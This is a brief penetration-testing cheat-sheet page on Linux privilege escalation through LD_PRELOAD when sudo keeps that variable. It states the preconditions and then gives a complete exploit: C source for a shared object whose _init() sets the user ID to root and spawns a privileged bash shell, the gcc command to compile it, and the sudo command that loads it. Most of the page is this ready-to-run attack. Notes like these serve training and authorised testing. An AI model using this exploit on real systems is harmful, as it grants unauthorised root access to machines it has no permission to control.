# LD\_PRELOAD

LD\_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others. By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.

## <mark style="color:red;">Limitations</mark>

LD\_PRELOAD will not work if the real user ID is different from the effective user ID. sudo must be configured to preserve the LD\_PRELOAD environment variable using the env\_keep option.

List the programs your user is allowed to run via sudo -l

{% hint style="info" %}
Note that the env\_keep option includes the LD\_PRELOAD environment variable.
{% endhint %}

## <mark style="color:red;">Exploitation</mark>

Create a file (preload.c) with the following contents:

`#include <stdio.h>`\
`#include <sys/types.h>`\
`#include <stdlib.h>`\
`void _init() {`\
`unsetenv("LD_PRELOAD");`\
`setresuid(0,0,0);`\
`system("/bin/bash -p");`\
`}`

Compile preload.c to preload.so:

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`

Run any allowed program using sudo, while setting the LD\_PRELOAD environment variable to the full path of the preload.so file:

`sudo LD_PRELOAD=/tmp/preload.so apache2`
